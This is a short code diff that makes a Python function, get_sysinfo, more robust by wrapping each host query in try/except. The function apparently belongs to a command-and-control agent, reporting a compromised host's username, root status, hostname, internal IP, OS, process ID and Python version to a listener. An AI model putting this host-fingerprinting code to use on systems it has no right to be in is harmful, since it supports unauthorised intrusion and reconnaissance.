@@ -587,19 +587,44 @@ def get_sysinfo():
 
     # listener | username | high_integrity | hostname | internal_ip | os_details | process_id | py_version
     #username = os.getlogin()
-    username = pwd.getpwuid(os.getuid())[0] 
+    __FAILED_FUNCTION = '[FAILED QUERY]'
 
-    uid = os.popen('id -u').read().strip()
-    highIntegrity = "True" if (uid == "0") else False
-
-    osDetails = os.uname()
-    hostname = osDetails[1]
-
-    internalIP = internalIP = socket.gethostbyname(socket.gethostname())
-
-    osDetails = ",".join(osDetails)
-    processID = os.getpid()
-    pyVersion = '.'.join([str(y) for y in sys.version_info])
+    try:
+        username = pwd.getpwuid(os.getuid())[0]
+    except Exception as e:
+        username = __FAILED_FUNCTION
+    try:
+        uid = os.popen('id -u').read().strip()
+    except Exception as e:
+        uid = __FAILED_FUNCTION
+    try:
+        highIntegrity = "True" if (uid == "0") else False
+    except Exception as e:
+        highIntegrity = __FAILED_FUNCTION
+    try:
+        osDetails = os.uname()
+    except Exception as e:
+        osDetails = __FAILED_FUNCTION
+    try:
+        hostname = osDetails[1]
+    except Exception as e:
+        hostname = __FAILED_FUNCTION
+    try:
+        internalIP = internalIP = socket.gethostbyname(socket.gethostname())
+    except Exception as e:
+        internalIP = __FAILED_FUNCTION
+    try:
+        osDetails = ",".join(osDetails)
+    except Exception as e:
+        osDetails =  __FAILED_FUNCTION
+    try:
+        processID = os.getpid()
+    except Exception as e:
+        processID = __FAILED_FUNCTION
+    try:
+        pyVersion = '.'.join([str(y) for y in sys.version_info])
+    except Exception as e:
+        pyVersion = __FAILED_FUNCTION
 
     return "%s|%s|%s|%s|%s|%s|%s|%s" % (server, username, highIntegrity, hostname, internalIP, osDetails, processID, pyVersion)
 
